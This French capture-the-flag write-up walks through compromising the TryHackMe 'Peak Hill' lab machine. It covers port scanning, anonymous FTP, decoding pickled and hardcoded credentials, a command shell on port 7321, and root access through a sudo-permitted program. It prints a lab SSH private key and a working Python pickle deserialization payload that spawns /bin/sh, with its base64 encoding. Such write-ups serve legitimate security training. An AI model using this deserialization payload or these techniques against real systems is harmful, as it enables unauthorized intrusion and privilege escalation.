# Peak Hill #

## Task 1 Peak Hill ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.209.110  peakhill.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A peakhill.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 17:53 CEST
Nmap scan report for peakhill.thm (10.10.209.110)
Host is up (0.036s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE  VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.228.66
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)
|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
7321/tcp open   swx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     Username: Password:
|   NULL: 
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7321-TCP:V=7.91%I=7%D=9/1%Time=612FA325%P=x86_64-pc-linux-gnu%r(NUL
SF:L,A,"Username:\x20")%r(GenericLines,14,"Username:\x20Password:\x20")%r(
SF:GetRequest,14,"Username:\x20Password:\x20")%r(HTTPOptions,14,"Username:
SF:\x20Password:\x20")%r(RTSPRequest,14,"Username:\x20Password:\x20")%r(RP
SF:CCheck,14,"Username:\x20Password:\x20")%r(DNSVersionBindReqTCP,14,"User
SF:name:\x20Password:\x20")%r(DNSStatusRequestTCP,14,"Username:\x20Passwor
SF:d:\x20")%r(Help,14,"Username:\x20Password:\x20")%r(SSLSessionReq,14,"Us
SF:ername:\x20Password:\x20")%r(TerminalServerCookie,14,"Username:\x20Pass
SF:word:\x20")%r(TLSSessionReq,14,"Username:\x20Password:\x20")%r(Kerberos
SF:,14,"Username:\x20Password:\x20")%r(SMBProgNeg,14,"Username:\x20Passwor
SF:d:\x20")%r(X11Probe,14,"Username:\x20Password:\x20")%r(FourOhFourReques
SF:t,14,"Username:\x20Password:\x20")%r(LPDString,14,"Username:\x20Passwor
SF:d:\x20")%r(LDAPSearchReq,14,"Username:\x20Password:\x20")%r(LDAPBindReq
SF:,14,"Username:\x20Password:\x20")%r(SIPOptions,14,"Username:\x20Passwor
SF:d:\x20")%r(LANDesk-RC,14,"Username:\x20Password:\x20")%r(TerminalServer
SF:,14,"Username:\x20Password:\x20")%r(NCP,14,"Username:\x20Password:\x20"
SF:)%r(NotesRPC,14,"Username:\x20Password:\x20")%r(JavaRMI,14,"Username:\x
SF:20Password:\x20")%r(WMSRequest,14,"Username:\x20Password:\x20")%r(oracl
SF:e-tns,14,"Username:\x20Password:\x20")%r(ms-sql-s,14,"Username:\x20Pass
SF:word:\x20")%r(afp,14,"Username:\x20Password:\x20")%r(giop,14,"Username:
SF:\x20Password:\x20");
Device type: general purpose|specialized|storage-misc|broadband router|printer|WAP
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (90%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 20/tcp)
HOP RTT      ADDRESS
1   44.20 ms 10.9.0.1
2   44.37 ms peakhill.thm (10.10.209.110)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 432.20 seconds

```

D'après le scan nmap on a plusieurs services : 
Le service FTP sur le port 21.   
Le service SSH sur le port 22. 
Un service inconnu sur le 7321.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ftp peakhill.thm 
Connected to peakhill.thm.
220 (vsFTPd 3.0.3)
Name (peakhill.thm:tim): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 .
drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 ..
-rw-r--r--    1 ftp      ftp          7048 May 15  2020 .creds
-rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt
226 Directory send OK.

ftp> get .creds
local: .creds remote: .creds
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .creds (7048 bytes).
226 Transfer complete.
7048 bytes received in 0.00 secs (47.6702 MB/s)

ftp> get test.txt 
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (17 bytes).
226 Transfer complete.
17 bytes received in 0.00 secs (125.7694 kB/s)

```

On se connect sur le service FTP.    
La connexion en mode anonymous fonctionne.  
On récupère deux fichiers .creds et test.txt.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat test.txt 
vsftpd test file

tim@kali:~/Bureau/tryhackme/write-up$ cat .creds 
1000000000000011010111010111000100000000001010000101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001101010111000100000001010110000000000100000000000000000000000001110101011100010000001010000110011100010000001101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001100010111000100000100010110000000000100000000000000000000000001101000011100010000010110000110011100010000011001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011010101110001000001110101100000000001000000000000000000000000011100100111000100001000100001100111000100001001010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011001000110000011100010000101001101000000001011000011001110001000010110101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110111011100010000110001011000000000010000000000000000000000000101111101110001000011011000011001110001000011100101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110000011100010000111101011000000000010000000000000000000000000110011101110001000100001000011001110001000100010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001101100111000100010010010110000000000100000000000000000000000001101100011100010001001110000110011100010001010001011000000010010000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001101010111000100010101010110000000000100000000000000000000000000110011011100010001011010000110011100010001011101011000000010010000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010111000100011000010110000000000100000000000000000000000000110001011100010001100110000110011100010001101001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011001001110001000110110110100000001101100001100111000100011100010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110010011100010001110101011000000000010000000000000000000000000100000001110001000111101000011001110001000111110101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110010011100010010000001011000000000010000000000000000000000000110010101110001001000011000011001110001001000100101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110101011100010010001101011000000000010000000000000000000000000110100101110001001001001000011001110001001001010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001110000111000100100110011010000000110110000110011100010010011101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011011101110001001010000101100000000001000000000000000000000000011001000111000100101001100001100111000100101010010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011001101110001001010110101100000000001000000000000000000000000011010110111000100101100100001100111000100101101010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100111001011100010010111001011000000000010000000000000000000000000111010001110001001011111000011001110001001100000101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110110011100010011000101011000000000010000000000000000000000000111001101110001001100101000011001110001001100110101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100111001011100010011010001101000000110011000011001110001001101010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001100110111000100110110010110000000000100000000000000000000000001110111011100010011011110000110011100010011100001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011000101110001001110010110100000010110100001100111000100111010010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011010001110001001110110110100000010011100001100111000100111100010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110100011100010011110101011000000000010000000000000000000000000011000001110001001111101000011001110001001111110101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110110011100010100000001011000000000010000000000000000000000000110111001110001010000011000011001110001010000100101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010011100010100001101011000000000010000000000000000000000000110001101110001010001001000011001110001010001010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001100110111000101000110011010000000100010000110011100010100011101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010011011001110001010010000110100001000001100001100111000101001001010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011100001110001010010100110100000011110100001100111000101001011010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110111011100010100110001101000001010011000011001110001010011010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001101000111000101001110011010000011111010000110011100010100111101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001100110111000101010000011010000000100010000110011100010101000101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001101000111000101010010011010000010110010000110011100010101001101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010011000101110001010101000110100000001101100001100111000101010101010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000001110001010101100101100000000001000000000000000000000000011100000111000101010111100001100111000101011000010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110000011100010101100101101000000110011000011001110001010110100110010100101110
```

Dans le fichier c'est du binaire.  

![page1](./Task1-01.png)

On convertie le binaire en ascii.    

D'après le titre de l'exercise on devine que le contenue du fichier c'est un objet python sérialisé, et qu'il faut utiliser le module pickle pour dé-sérialisé l'objet.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat convert.py 
import pickle

output = pickle.load(open('download.dat', 'rb'))

pass_str = ''
user_str = ''
password_list = []
username_list = []

for i,x in output:
    if 'ssh_pass' in i:              # si mot de passe ssh
        i = int(i[8::])              # convertie entier la position de la lettre du mot de passe
        password_list.append((i,x))  # sauvegarde le tout dans la liste

    else:                            # sinon c'est l'utilisateur
        i = int(i[8::])              # conversion en int
        username_list.append((i,x))  # sauvegarde des données

password_list.sort()                 # on trie dans le bon ordre le mot de passe
for i, x in password_list:
    pass_str += x                    # sauvegarde le résultat dans une chaîne

username_list.sort()                 # idem que pour le mot de passe.
for i, x in username_list:
    user_str += x

print('Username: ' + user_str)
print('Password: ' + pass_str)

tim@kali:~/Bureau/tryhackme/write-up$ python3 convert.py 
Username: gherkin
Password: p1ckl3s_@11_@r0und_th3_w0rld
```

On crée extrait les données et on retrouve les identifiants.    
Nom : gherkin    
Mot de passe : p1ckl3s_@11_@r0und_th3_w0rld

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh gherkin@peakhill.thm 
The authenticity of host 'peakhill.thm (10.10.209.110)' can't be established.
ECDSA key fingerprint is SHA256:Sd7FbFG/ONtOc68MfKQvn1095/ZlenM0GzXpjjKIycQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'peakhill.thm,10.10.209.110' (ECDSA) to the list of known hosts.
gherkin@peakhill.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


28 packages can be updated.
19 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

gherkin@ubuntu-xenial:~$ ls ../
dill  gherkin

gherkin@ubuntu-xenial:~$ ls ../dill
user.txt

cat: /home/dill/user.txt: Permission denied

gherkin@ubuntu-xenial:~$ ls
cmd_service.pyc
```

On trouve un autre utilisateur dill avec un fichier user.txt.  
On tente de le lire mais on a pas les bons droits.    

On trouve dans le répertoire gherkin fichier en bytecode python cmd_service.pyc.  


```bash
tim@kali:~/Bureau/tryhackme/write-up$ scp gherkin@peakhill.thm:cmd_service.pyc ./
gherkin@peakhill.thm's password: 
cmd_service.pyc                       

tim@kali:~/Bureau/tryhackme/write-up$ git clone https://github.com/timruff/pycdc  
tim@kali:~/Bureau/tryhackme/write-up$ cd pycdc/
tim@kali:~/Bureau/tryhackme/write-up/pycdc$ cmake ./
tim@kali:~/Bureau/tryhackme/write-up/pycdc$ make 
tim@kali:~/Bureau/tryhackme/write-up/pycdc$ sudo make install
```
```python
tim@kali:~/Bureau/tryhackme/write-up$ pycdc cmd_service.pyc 
# Source Generated with Decompyle++
# File: cmd_service.pyc (Python 3.8)

from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys
import textwrap
import socketserver
import string
import readline
import threading
from time import *
import getpass
import os
import subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes(0x6E337633725F405F64316C6C5F6D306D336E74L)

def Service():
    '''Service'''
    
    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username and password_input == password:
            return True
        return None

    
    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return None
        None.send(b'Successfully logged in!')
        command = self.receive(b'Cmd: ')
        p = subprocess.Popen(command, True, subprocess.PIPE, subprocess.PIPE, **('shell', 'stdout', 'stderr'))
        self.send(p.stdout.read())
        continue

    
    def send(self, string, newline = (True,)):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    
    def receive(self, prompt = (b'> ',)):
        self.send(prompt, False, **('newline',))
        return self.request.recv(4096).strip()


Unsupported Node type: 26
Service = <NODE:26>(Service, 'Service', socketserver.BaseRequestHandler)

def ThreadedService():
    '''ThreadedService'''
    pass

Unsupported Node type: 26
ThreadedService = <NODE:26>(ThreadedService, 'ThreadedService', socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler)

def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(server.serve_forever, **('target',))
    server_thread.daemon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    sleep(10)
    continue

if __name__ == '__main__':
    main()
```

On récupère un dé-compilateur python.   
On extrait le code source.   

Dans le code source on reconnaît le port qui était inconnu donc on sait que c'est se programme qui écoute le port 7321.   
Dans le programme on remarque de chaîne qui sont des identifiants.  
username qui a la valeur 1684630636 en décimal.   
password qui a la valeur 0x6E337633725F405F64316C6C5F6D306D336E74L en héxadécimal.   
On remarque que si le nom d'utilisateur et le mot de passe est bon alors on a un shell.   

**What is the user flag?**

```python
tim@kali:~/Bureau/tryhackme/write-up$ cat decode.py 
from Crypto.Util.number import bytes_to_long, long_to_bytes
username = long_to_bytes(1684630636)
password = long_to_bytes(0x6E337633725F405F64316C6C5F6D306D336E74)

print(username)
print(password)
```
```bash
tim@kali:~/Bureau/tryhackme/write-up$ python decode.py 
b'dill'
b'n3v3r_@_d1ll_m0m3nt'
```

On décode les chaînes et on trouve les identifiants :   
Nom : dill    
Mot de passe : n3v3r_@_d1ll_m0m3nt   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc peakhill.thm 7321
Username: dill
Password: n3v3r_@_d1ll_m0m3nt
Successfully logged in!

Cmd: id
uid=1003(dill) gid=1003(dill) groups=1003(dill)

Cmd: ls -la /home/
total 16
drwxr-xr-x  4 root    root    4096 May 15  2020 .
drwxr-xr-x 25 root    root    4096 Sep  1 15:51 ..
drwxr-xr-x  5 dill    dill    4096 May 20  2020 dill
drwxr-xr-x  3 gherkin gherkin 4096 Sep  1 16:48 gherkin

Cmd: cat /home/dill/user.txt
f1e13335c47306e193212c98fc07b6a0

```

Avec les identifiants on obtient une invite de commande avec les droits dill.  
On lit le fichier user.txt.  
On obtient notre premier flag.  

La réponse est : f1e13335c47306e193212c98fc07b6a0    

```bash
Cmd: ls -a /home/dill
.
..
.bash_history
.bashrc
.cache
.nano
.ssh
user.txt

Cmd: ls -a /home/dill/.ssh   
.
..
authorized_keys
id_rsa
id_rsa.pub

Cmd: cat /home/dill/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
/V7pwBay5mHnsAAAAKam9obkB4cHMxNQE=
-----END OPENSSH PRIVATE KEY-----

```

On récupère la clef privée de drill.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ chmod 600 id_rsa 
tim@kali:~/Bureau/tryhackme/write-up$ ssh -i id_rsa dill@peakhill.thm 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


28 packages can be updated.
19 updates are security updates.


Last login: Wed May 20 21:56:05 2020 from 10.1.122.133

Last login: Wed May 20 21:56:05 2020 from 10.1.122.133
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```

Avec la clef privée de dill on obtient une session secure shell.   
On voit que avec cette configuration sudo on peut exécuter peak_hill_farm avec les droits root sans mot de passe.  

```bash
dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: sh
failed to decode base64

dill@ubuntu-xenial:~$ echo sh | base64
c2gK

dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: c2gK
this not grow did not grow on the Peak Hill Farm! :(
```

On tente de trouver de mettre un phrase valide cela ne fonctionne pas.   

```python
tim@kali:~/Bureau/tryhackme/write-up$ cat code.py 
import pickle
import os
import base64

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh', ))

pickle_data = pickle.dumps(EvilPickle())

print(base64.b64encode(pickle_data))
```

```bash
tim@kali:~/Bureau/tryhackme/write-up$ python3 code.py 
b'gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAcvYmluL3NolIWUUpQu'
```

Quand on pense au début de l'exercise la personne avec sérialisé un objet.
On fait la même chose mais avec notre propre chaîne puis on l'encode en base64.  

```bash
dill@ubuntu-xenial:/$ sudo /opt/peak_hill_farm/peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAcvYmluL3NolIWUUpQu
# id
uid=0(root) gid=0(root) groups=0(root)
# cd root
# cat *
e88f0a01135c05cf0912cf4bc335ee28
```

On passant la chaîne on a un shell avec les droits root.   
On lit le fichier root.txt dans root.    

La réponse est : e88f0a01135c05cf0912cf4bc335ee28   
